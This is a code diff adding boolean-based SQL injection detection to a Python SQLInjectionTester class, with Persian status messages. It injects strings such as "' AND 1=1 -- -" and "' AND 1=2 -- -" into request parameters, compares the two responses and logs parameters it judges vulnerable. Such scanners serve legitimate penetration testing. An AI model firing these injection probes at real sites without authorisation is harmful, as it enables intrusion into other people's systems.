@@ -238,3 +238,41 @@ class SQLInjectionTester:
                         {"type": "Time-based", "payload": payload, "error": None})
 
 
+
+                # تست Boolean-based
+                test_data_true = test_data.copy()
+                if isinstance(test_data_true, dict):
+                    test_data_true[parameter_name] += "' AND 1=1 -- -" + payload
+                else:
+                    parsed_data_true = parse_qs(test_data_true)
+                    if parameter_name in parsed_data_true:
+                        parsed_data_true[parameter_name][0] += "' AND 1=1 -- -" + payload
+                    test_data_true = urlencode(parsed_data_true, doseq=True)
+
+                response_true = self.send_request(data=test_data_true)
+
+                test_data_false = test_data.copy()
+                if isinstance(test_data_false, dict):
+                    test_data_false[parameter_name] += "' AND 1=2 -- -" + payload
+                else:
+                    parsed_data_false = parse_qs(test_data_false)
+                    if parameter_name in parsed_data_false:
+                        parsed_data_false[parameter_name][0] += "' AND 1=2 -- -" + payload
+                    test_data_false = urlencode(parsed_data_false, doseq=True)
+                response_false = self.send_request(data=test_data_false)
+
+                if self.analyze_response_boolean(response_true, response_false):
+                    print(f"    [!] آسیب‌پذیری احتمالی (Boolean-based): با Payload: {payload}")
+                    is_vulnerable = True
+                    if parameter_name not in self.vulnerabilities:
+                        self.vulnerabilities[parameter_name] = []
+                    self.vulnerabilities[parameter_name].append({"type": "Boolean-based", "payload": payload, "error": None})
+
+            if self.delay > 0:
+                time.sleep(self.delay)
+
+        if not is_vulnerable:
+            print(f"    [-] آسیب‌پذیری SQL Injection برای پارامتر '{parameter_name}' یافت نشد.")
+        return is_vulnerable
+
+
